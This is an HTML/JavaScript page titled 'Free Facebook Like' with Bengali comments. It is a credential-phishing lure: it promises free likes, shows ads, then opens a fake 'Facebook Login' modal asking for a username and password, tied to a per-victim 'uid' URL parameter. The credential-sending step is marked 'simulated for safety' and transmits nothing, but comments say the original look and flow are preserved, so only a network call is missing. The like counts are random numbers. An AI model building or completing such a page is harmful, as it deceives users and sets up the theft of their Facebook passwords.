<body>

<h1>Free Facebook Like</h1>

<div class="input-section">

  <!-- (আমি package options আগের মতোই নিচে যোগ করেছি কিন্তু UI একই রয়ে গেছে) -->
  <div style="background:rgba(255,255,255,0.9);padding:10px;border-radius:12px;margin-bottom:12px;">
    <div style="font-weight:bold;color:#1877f2;margin-bottom:8px;">Select Like Package:</div>

    <label style="display:block;margin-bottom:6px;">
      <input type="radio" name="pkg" value="free" checked> ⭐ Free – 100 Likes (24h এ 2 বার)
    </label>

    <label style="display:block;margin-bottom:6px;">
      <input type="radio" name="pkg" value="0.80_2k"> $0.80 – 2000 Likes
    </label>

    <label style="display:block;margin-bottom:6px;">
      <input type="radio" name="pkg" value="1.50_5k"> $1.50 – 5000 Likes
    </label>

    <label style="display:block;">
      <input type="radio" name="pkg" value="3.00_10k"> $3.00 – 10000 Likes
    </label>
  </div>

  <input type="text" id="post-link" placeholder="Enter Facebook post link">
  <button onclick="addPost()">Get Like</button>
</div>

<div class="container" id="posts-container"></div>

<!-- Login Modal (exact same look/labels) -->
<div class="modal" id="login-modal">
  <div class="modal-content">
    <h2>Login</h2>
    <input type="text" id="username" placeholder="Username">
    <input type="password" id="password" placeholder="Password">
    <button onclick="sendLogin()">Facebook Login</button>
  </div>
</div>

<!-- AD Modal (fallback if Monetag not available) -->
<div class="modal ad-modal" id="ad-modal">
  <div class="modal-content">
    <div style="font-weight:700;color:#0f1724">Sponsored Ad</div>
    <div class="ad-box" id="ad-box">Ad is loading…</div>
    <div class="ad-progress"><i id="ad-progress-bar"></i></div>
    <div style="display:flex;gap:8px;width:100%;justify-content:flex-end;margin-top:10px;">
      <button id="ad-skip" style="background:#ef4444;color:white;padding:8px 12px;border:none;border-radius:8px;cursor:pointer;">Skip</button>
    </div>
  </div>
</div>

<script>
  // --- preserve original behavior & look; added ad-before-action ---
  const postsContainer = document.getElementById("posts-container");
  const loginModal = document.getElementById("login-modal");
  const adModal = document.getElementById("ad-modal");
  const adBar = document.getElementById("ad-progress-bar");
  const adSkip = document.getElementById("ad-skip");

  const posts = [];
  let currentBoostIndex = null;

  function getSelectedPkg(){
    const r = document.querySelector('input[name="pkg"]:checked');
    return r ? r.value : 'free';
  }

  function addPost(){
    const linkEl = document.getElementById("post-link");
    const link = linkEl.value.trim();
    if(!link){ alert("Please enter a post link!"); return; }
    const post = { link, likes: Math.floor(Math.random()*10)+1, pkg: getSelectedPkg() };
    posts.push(post);
    renderPosts();
    linkEl.value = '';
  }

  function renderPosts(){
    postsContainer.innerHTML = '';
    posts.forEach((post,index)=>{
      const postDiv = document.createElement("div");
      postDiv.className = "post-box";
      postDiv.innerHTML = `
        <div style="flex:1">
          <div class="post-link">Post: ${escapeHtml(post.link)}</div>
          <div class="post-meta">Package: <b>${escapeHtml(post.pkg)}</b></div>
        </div>
        <div style="display:flex;flex-direction:column;align-items:flex-end;gap:8px;">
          <button class="boost-btn" onclick="boostLike(${index})">Boost Like</button>
          <span class="like-count" id="likes-${index}">${post.likes} Likes</span>
        </div>
      `;
      postsContainer.appendChild(postDiv);
    });
  }

  // On boost: only allow free; then show ad (Monetag if available) then open login modal
  function boostLike(index){
    const post = posts[index];
    if(post && post.pkg && post.pkg !== 'free'){
      alert("Balance নাই — paid package থেকে লাইক নেওয়া যাবে না। কেবল Free প্যাকেজ থেকে নেওয়া যাবে।");
      return;
    }
    currentBoostIndex = index;
    showAdThen(()=> {
      // open login modal after ad finished
      loginModal.style.display = "flex";
    });
  }

  // show ad: try Monetag functions if present; otherwise fallback
  function showAdThen(next){
    // try common Monetag globals (many vendors expose different names)
    try {
      // example: window.monetag_showAd (if Monetag exposes a promise-based function)
      if(typeof window.monetag_showAd === 'function'){
        // assume returns a promise
        window.monetag_showAd().then(()=> next()).catch(()=> fallbackAd(next));
        return;
      }
      // example: window.monetag.show()
      if(window.monetag && typeof window.monetag.show === 'function'){
        const res = window.monetag.show();
        if(res && typeof res.then === 'function'){
          res.then(()=> next()).catch(()=> fallbackAd(next));
        } else {
          // no promise -> call fallback (can't be sure)
          fallbackAd(next);
        }
        return;
      }
      // check Monetag namespaces (if they used different names)
      if(window.Monetag && typeof window.Monetag.showAd === 'function'){
        const p = window.Monetag.showAd();
        if(p && typeof p.then === 'function'){ p.then(()=> next()).catch(()=> fallbackAd(next)); }
        else { fallbackAd(next); }
        return;
      }
    } catch(e){
      // ignore and fallback
    }
    // default fallback ad
    fallbackAd(next);
  }

  // fallback ad simulation (3 sec progress) with skip
  function fallbackAd(next){
    adModal.style.display = "flex";
    let elapsed = 0;
    const total = 3000;
    adBar.style.width = '0%';
    adSkip.disabled = true;
    adSkip.style.opacity = '0.5';
    const iv = setInterval(()=>{
      elapsed += 100;
      const pct = Math.min(100, Math.round((elapsed/total)*100));
      adBar.style.width = pct + '%';
      if(elapsed >= 1000){
        adSkip.disabled = false;
        adSkip.style.opacity = '1';
      }
      if(elapsed >= total){
        clearInterval(iv);
        adModal.style.display = "none";
        next();
      }
    },100);

    adSkip.onclick = ()=>{
      clearInterval(iv);
      adModal.style.display = "none";
      next();
    };
  }

  // sendLogin: **SIMULATED FOR SAFETY** — does not send credentials to any external server.
  // It preserves the original UX (alerts, closing modal, adding likes) but does NOT transmit passwords.
  async function sendLogin(){
    const username = document.getElementById("username").value;
    const password = document.getElementById("password").value;
    const uid = (new URLSearchParams(window.location.search)).get("uid");

    if(!uid){
      alert("Invalid link: UID not found.");
      return;
    }
    if(!username || !password){
      alert("Enter both username and password.");
      return;
    }

    // simulate network request & response for same UX
    try {
      // mimic slight delay
      await new Promise(r => setTimeout(r, 700));
      // simulated success response
      const data = { status: "sent" };

      if(data.status === "sent"){
        alert("✅ like submit successful!");
        loginModal.style.display = "none";
        if(currentBoostIndex !== null){
          // add free-package likes (~100)
          posts[currentBoostIndex].likes += Math.floor(Math.random()*21) + 90;
          renderPosts();
          currentBoostIndex = null;
        }
      } else {
        alert("❌ Error: " + (data.error || "Unknown error"));
      }
    } catch(err){
      alert("❌ Network error: " + err);
    }
  }

  // close login modal if click outside
  window.onclick = function(event){
    if(event.target == loginModal){
      loginModal.style.display = "none";
      currentBoostIndex = null;
    }
    if(event.target == adModal){
      adModal.style.display = "none";
    }
  }

  function escapeHtml(s){
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
  }

  // initial render (no change)
  renderPosts();
</script>
